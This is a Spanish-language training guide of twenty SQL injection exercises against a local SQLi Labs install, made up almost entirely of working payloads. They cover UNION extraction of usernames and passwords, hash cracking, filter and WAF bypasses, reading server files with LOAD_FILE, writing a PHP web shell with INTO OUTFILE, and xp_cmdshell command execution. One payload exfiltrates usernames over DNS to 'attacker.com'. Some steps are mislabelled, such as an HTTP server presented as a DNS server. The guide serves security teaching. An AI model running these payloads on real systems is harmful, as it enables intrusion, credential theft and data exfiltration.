![M1](https://github.com/Grandote58/CloudSafeGuard/blob/main/Recursos/Recurso%201%402Menbrete1.png)

# **📌 PRÁCTICAS INTERMEDIAS Y AVANZADAS EN SQLi LABS**

🎯 **Objetivo:** Aprender y perfeccionar técnicas de **inyección SQL** en SQLi Labs, desde nivel intermedio hasta avanzado, incluyendo evasión de filtros, extracción de información y bypass de restricciones.

📌 **Requisitos previos:**

- Tener SQLi Labs configurado en **Windows 11 con XAMPP** o **Kali Linux con Apache/MySQL**.
- Conocimientos básicos en **PHP y MySQL**.
- Experiencia con **SQLMap y Burp Suite**.

⏳ **Duración estimada:** 10 - 15 horas (dependiendo de la complejidad de cada práctica).

# **📌 SQLi INTERMEDIO - EXTRACCIÓN DE DATOS**

## **🔹 Práctica 1: Identificación de Parámetros Vulnerables (Manual)**

📌 **Objetivo:** Encontrar campos vulnerables a SQLi.

**Pasos:**

1. Abre SQLi Labs y ve al Nivel 1:

   ```bash
http://localhost/sqli-labs/Less-1/
   ```

2. Modifica la URL:

   ```bash
   http://localhost/sqli-labs/Less-1/?id=1'
   ```
   
3. Si ves un error SQL, el campo es vulnerable.

## **🔹 Práctica 2: Extracción de Nombres de Bases de Datos**

📌 **Objetivo:** Obtener el nombre de la base de datos usando `database()`.

**Pasos:**

1. En la URL vulnerable, usa:

   ```sql
   http://localhost/sqli-labs/Less-1/?id=-1 UNION SELECT 1,database(),3 --+
   ```
   
2. Si el nombre de la base de datos aparece en pantalla, la inyección es exitosa.

## **🔹 Práctica 3: Listar Tablas de la Base de Datos**

📌 **Objetivo:** Obtener nombres de tablas.

**Pasos:**

1. Usa `information_schema.tables`:

   ```sql
   http://localhost/sqli-labs/Less-1/?id=-1 UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database() --+
   ```

2. Aparecerán nombres de tablas en la página.

## **🔹 Práctica 4: Obtener Nombres de Columnas**

📌 **Objetivo:** Extraer los nombres de columnas de la tabla `users`.

**Pasos:**

1. Usa `information_schema.columns` :

   ```sql
   http://localhost/sqli-labs/Less-1/?id=-1 UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users' --+
   ```

2. Se mostrarán los nombres de las columnas.

## **🔹 Práctica 5: Obtener Usuarios y Contraseñas**

📌 **Objetivo:** Extraer credenciales almacenadas.

**Pasos:**

1. Usa `UNION SELECT` para obtener datos:

   ```sql
   http://localhost/sqli-labs/Less-1/?id=-1 UNION SELECT 1,username,password FROM users --+
   ```

2. Se mostrarán los nombres de usuario y contraseñas (generalmente en hash).

## **🔹 Práctica 6: Decodificación de Hashes**

📌 **Objetivo:** Romper los hashes de contraseña obtenidos.

**Pasos:**

1. Copia el hash encontrado en la Práctica 5.

2. Usa herramientas como `Hashcat` en Kali Linux:

   ```html
hashcat -m 0 hash.txt rockyou.txt
   ```

3. Si el hash es común, obtendrás la contraseña en texto plano.

# **📌 TÉCNICAS AVANZADAS DE BYPASS**

## **🔹 Práctica 7: Bypass de Filtros con Comentarios**

📌 **Objetivo:** Evadir filtros de `--` usando `/*! */`.

**Pasos:**

1. Prueba esta variante en la URL vulnerable:

   ```sql
   http://localhost/sqli-labs/Less-1/?id=-1 /*! UNION */ SELECT 1,username,password FROM users --+
   ```

## **🔹 Práctica 8: Inyección SQL Basada en Booleanos**

📌 **Objetivo:** Extraer información sin mostrar errores.

**Pasos:**

1. Verifica si el sitio es vulnerable con:

   ```sql
   http://localhost/sqli-labs/Less-1/?id=1 AND 1=1 --+
   ```
   
2. Prueba la condición falsa:

   ```sql
   http://localhost/sqli-labs/Less-1/?id=1 AND 1=0 --+
   ```
   
3. Si la respuesta cambia, la inyección basada en booleanos funciona.

------

## **🔹 Práctica 9: Explotación de SQLi Basada en Tiempo**

📌 **Objetivo:** Identificar inyección SQL cuando la aplicación no muestra errores.

**Pasos:**

1. Usa la función `SLEEP()`:

   ```sql
   http://localhost/sqli-labs/Less-1/?id=1' AND SLEEP(5) --+
   ```

2. Si la página tarda 5 segundos en cargar, la vulnerabilidad existe.

## **🔹 Práctica 10: SQLi Out-of-Band (OOB)**

📌 **Objetivo:** Extraer información a un servidor externo.

**Pasos:**

1. Configura un servidor web en Kali:

   ```sql
   python3 -m http.server 8080
   ```
   
2. Ejecuta la inyección:

   ```sql
   http://localhost/sqli-labs/Less-1/?id=1' UNION SELECT 1,LOAD_FILE('http://192.168.1.10:8080/exploit.txt'),3 --+
   ```

# **📌 ATAQUES AVANZADOS Y AUTOMATIZACIÓN**

## **🔹 Práctica 11: Uso de SQLMap para Automatizar el Ataque**

📌 **Objetivo:** Extraer datos con SQLMap.

**Pasos:**

1. Ejecuta:

   ```sql
   sqlmap -u "http://localhost/sqli-labs/Less-1/?id=1" --dbs
   ```
   
2. Enumera tablas:

   ```sql
   sqlmap -u "http://localhost/sqli-labs/Less-1/?id=1" -D security --tables
   ```

------

## **🔹 Práctica 12: Uso de Burp Suite para Interceptar Peticiones**

📌 **Objetivo:** Modificar peticiones SQLi en tráfico HTTP.

**Pasos:**

1. Inicia **Burp Suite** y activa el **proxy**.
2. Captura una solicitud GET en SQLi Labs.
3. Modifica los parámetros y prueba inyecciones manualmente.

## **🔹 PRÁCTICA 13: Bypass de Filtros Usando Codificación Hexadecimal**

📌 **Objetivo:** Evadir filtrado de caracteres especiales mediante el uso de valores hexadecimales.

### **🔹 Explicación**

Algunas aplicaciones bloquean palabras clave como `'UNION'` o `'SELECT'`. Podemos **convertirlas en hexadecimal** para evadir el filtrado.

### **🔹 Paso a Paso**

1. Conviértete en hexadecimal la palabra `admin`:

   ```sql
   SELECT HEX('admin');
   ```

   Resultado:

   ```sql
   61646D696E
   ```
   
2. Utiliza este valor en SQLi Labs:

   ```sql
   http://localhost/sqli-labs/Less-1/?id=-1 UNION SELECT 1,0x61646D696E,3 --+
   ```
   
3. Si `admin` aparece en pantalla, la evasión fue exitosa.

📌 **💡 Consejo:** Usa **CyberChef** o **Burp Suite** para convertir datos a hexadecimal fácilmente.

## **🔹 PRÁCTICA 14: Evadir WAFs con Caracteres Alternativos**

## 📌 **Objetivo:** Bypassear Web Application Firewalls (WAFs) utilizando caracteres especiales.

### **🔹 Explicación**

Algunos WAFs bloquean `' OR 1=1 --` pero permiten variaciones como:

- `%00` (NULL byte)
- `+` (Espacio en blanco)
- `%23` (Comentario en URL)

### **🔹 Paso a Paso**

1. Usa `%00` para truncar la consulta:

   ```
   http://localhost/sqli-labs/Less-1/?id=1%00' OR 1=1 --+
   ```

2. Prueba con 

   comentarios URL `(%23)` equivale a `#` en SQL):

   ```sql
   http://localhost/sqli-labs/Less-1/?id=1' OR 1=1%23
   ```
   
3. Si está bloqueado, usa 

   codificación de espacios `(+)`  o `(%20)`:

   ```sql
   http://localhost/sqli-labs/Less-1/?id=1'/**/OR/**/1=1--+
   ```

📌 **💡 Consejo:** Usa **Burp Suite** para probar diferentes técnicas de evasión.

## **🔹 PRÁCTICA 15: Uso de `GROUP_CONCAT()` para Extraer Múltiples Registros**

📌 **Objetivo:** Extraer múltiples datos en una sola consulta SQL.

### **🔹 Explicación**

El operador `GROUP_CONCAT()` permite **combinar resultados en una sola línea**.

### **🔹 Paso a Paso**

1. Encuentra la cantidad de columnas:

   ```html
   http://localhost/sqli-labs/Less-1/?id=-1 ORDER BY 3 --+
   ```
   
2. Extrae usuarios y contraseñas con `GROUP_CONCAT()`:

   ```html
   http://localhost/sqli-labs/Less-1/?id=-1 UNION SELECT 1,GROUP_CONCAT(username,':',password SEPARATOR ' | '),3 FROM users --+
   ```

3. Si la consulta es exitosa, verás los datos separados por `|`.

📌 **💡 Consejo:** Usa `GROUP_CONCAT()` con `information_schema.columns` para listar todas las columnas de una base de datos.

------

## **🔹 PRÁCTICA 16: Extracción de Archivos con `LOAD_FILE()`**

📌 **Objetivo:** Leer archivos del servidor utilizando SQLi.

### **🔹 Explicación**

Si `LOAD_FILE()` está habilitado, podemos leer archivos del sistema.

### **🔹 Paso a Paso**

1. Prueba si `LOAD_FILE()` está disponible:

   ```html
   http://localhost/sqli-labs/Less-1/?id=-1 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3 --+
   ```

2. En Windows, prueba con:

   ```html
   http://localhost/sqli-labs/Less-1/?id=-1 UNION SELECT 1,LOAD_FILE('C:/xampp/apache/logs/access.log'),3 --+
   ```
   
3. Si el contenido del archivo aparece, el servidor es vulnerable.

📌 **💡 Consejo:** Muchas configuraciones de seguridad bloquean `LOAD_FILE()`. Prueba `INTO OUTFILE` para escribir en archivos.

## **🔹 PRÁCTICA 17: Creación de una Web Shell con `SELECT INTO OUTFILE`**

📌 **Objetivo:** Subir un **webshell PHP** usando SQLi.

### **🔹 Explicación**

`SELECT INTO OUTFILE` permite escribir archivos en el servidor web.

### **🔹 Paso a Paso**

1. Comprueba los permisos:

   ```sql
   http://localhost/sqli-labs/Less-1/?id=-1 UNION SELECT 1,@@secure_file_priv,3 --+
   ```
   
2. Crea un webshell PHP:

   ```sql
   http://localhost/sqli-labs/Less-1/?id=-1 UNION SELECT 1,"<?php system($_GET['cmd']); ?>",3 INTO OUTFILE 'C:/xampp/htdocs/shell.php' --+
   ```
   
3. Accede a la shell en el navegador:

   ```sql
   http://localhost/shell.php?cmd=whoami
   ```
   
4. Si ves el usuario del servidor, ¡explotación exitosa!

📌 **💡 Consejo:** **Usa `nc.exe` o `msfvenom` para obtener una shell reversa en Windows.**

------

## **🔹 PRÁCTICA 18: Inyección SQL en PostgreSQL y Microsoft SQL Server**

📌 **Objetivo:** Explorar diferencias entre bases de datos.

### **🔹 Explicación**

Diferentes motores de bases de datos requieren sintaxis específica.

### **🔹 Paso a Paso**

1. Detecta el motor de base de datos con:

    ```sql
   SELECT version();
   ```
   
2. PostgreSQL SQLi (equivalente a SLEEP() en MySQL):

    ```sql
   ' OR pg_sleep(5) --
   ```
   
3. SQL Server SQLi:

   ```sql
   ' OR 1=1; WAITFOR DELAY '0:0:5' --
   ```
   
4. Evadiendo detección en SQL Server:

   ```sql
   ' OR 1=1; EXEC xp_cmdshell('whoami') --
   ```

📌 **💡 Consejo:** **SQL Server permite ejecución de comandos en el sistema si `xp_cmdshell` está habilitado.**

------

## **🔹 PRÁCTICA 19: Automatización de Ataques SQLi con Python**

📌 **Objetivo:** Crear un script en Python para SQLi automatizado.

### **🔹 Paso a Paso**

1. Instala requests:

   ```sql
   pip install requests
   ```
   
2. Crea un script en Python:

   ```sql
   import requests
   url = "http://localhost/sqli-labs/Less-1/?id="
   payload = "' UNION SELECT 1,username,password FROM users --+"
   response = requests.get(url + payload)
   print(response.text)
   ```

3. **Ejecuta el script y analiza la respuesta.**

------

## **🔹 PRÁCTICA 20: Uso de DNS Exfiltration para Filtrar Datos**

📌 **Objetivo:** Exfiltrar datos a un servidor externo usando `LOAD_FILE()`.

### **🔹 Paso a Paso**

1. Configura un servidor DNS en Kali Linux:

   ```sql
   sudo python3 -m http.server 8080
   ```
   
2. Ejecuta la inyección:

   ```sql
   ' UNION SELECT 1,LOAD_FILE(CONCAT('\\\\attacker.com\\',username)) FROM users --+
   ```
   
3. **Captura las solicitudes en Wireshark o tcpdump.**

📌 **💡 Consejo:** **Usa herramientas como dnscat2 para túneles de exfiltración de datos.**

# **📌 CONCLUSIÓN**

✅ **Has completado técnicas avanzadas de SQLi.**
🚀 **Ahora puedes probar estas habilidades en entornos reales con autorización.**

![M2](https://github.com/Grandote58/CloudSafeGuard/blob/main/Recursos/Recurso%203%402Menbrete2.png)
